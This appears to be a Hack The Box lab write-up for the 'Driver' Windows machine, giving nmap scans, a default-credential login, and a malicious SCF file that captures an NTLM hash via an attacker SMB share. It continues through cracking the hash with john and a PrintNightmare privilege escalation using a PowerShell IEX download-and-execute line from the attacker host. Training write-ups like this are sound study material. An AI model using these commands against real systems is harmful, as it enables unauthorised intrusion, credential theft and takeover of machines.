---
layout: single
title: Driver - Hack The Box
excerpt: "Driver is an easy Windows machine that focuses on printer exploitation. Enumeration of the machine reveals that a web server is listening on port 80, along with SMB on port 445 and WinRM on port 5985. Navigation to the website reveals that it&amp;amp;amp;#039;s protected using basic HTTP authentication. While trying common credentials the `admin:admin` credential is accepted and we are able to visit the webpage. The webpage provides a feature to upload printer firmwares on an SMB share for a remote team to test and verify. Uploading a Shell Command File that contains a command to fetch a remote file from our local machine, leads to the NTLM hash of the user `tony` relayed back to us. Cracking the captured hash to retrieve a plaintext password we are able login as `tony`, using WinRM. Then, switching over to a meterpreter session it is discovered that the machine is vulnerable to a local privilege exploit that abuses a specific printer driver that is present on the remote machine. Using the exploit we can get a session as `NT AUTHORITY\\SYSTEM`."
date: 2025-05-13
classes: wide
header:
  teaser: /img2/driver.PNG
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Windows
  - Easy
tags:
  - Password Guessing
  - SCF Malicious File
  - Print Spooler Local Privilege Escalation (PrintNightmare) [CVE-2021-1675]
---

## Reconnaissance

- Nmap 

```bash
nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.10.11.106
```

![](/img2/Pasted%20image%2020250513093712.png)

- Version and vulnerability scan

```bash
nmap -sCV -p135,445 -vvv 10.10.11.106
```

![](/img2/Pasted%20image%2020250513094009.png)

## Exploitation

- Default password

![](/img2/Pasted%20image%2020250513094105.png)

- Malicious scf file

```
[Shell]
Command=2
IconFile=\\10.10.16.2\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```

![](/img2/Pasted%20image%2020250513102137.png)

```bash
impacket-smbserver smbFolder -smb $(pwd) -smb2support
```

![](/img2/Pasted%20image%2020250513102233.png)

```bash
john hash.txt -wordlist=/usr/share/wordlists/rockyou.txt
```

![](/img2/Pasted%20image%2020250513102407.png)

- Conect with EvilWinRM

```bash
evil-winrm -i 10.10.11.106 -u tony -p liltony
```

## Post-exploitation

- Run enumeration script WinPEAS

```bash
./winPEASx64.exe
```

![](/img2/Pasted%20image%2020250513130643.png)

- CVE-2021-1675 - PrintNightmare

```bash
wget https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/refs/heads/main/CVE-2021-1675.ps1
```

```bash
python3 -m http.server
```

```powershell
IEX(New-Object Net.WebClient).downloadString('http://10.10.16.2:8000/exploit.ps1')
```

```powershell
Invoke-Nightmare -DriverName "Xerox" -NewUser "pyuser" -NewPassword "pyuser" 
```

![](/img2/Pasted%20image%2020250513133824.png)

```bash
evil-winrm -i 10.10.11.106 -u pyuser -p pyuser
```

![](/img2/Pasted%20image%2020250513134132.png)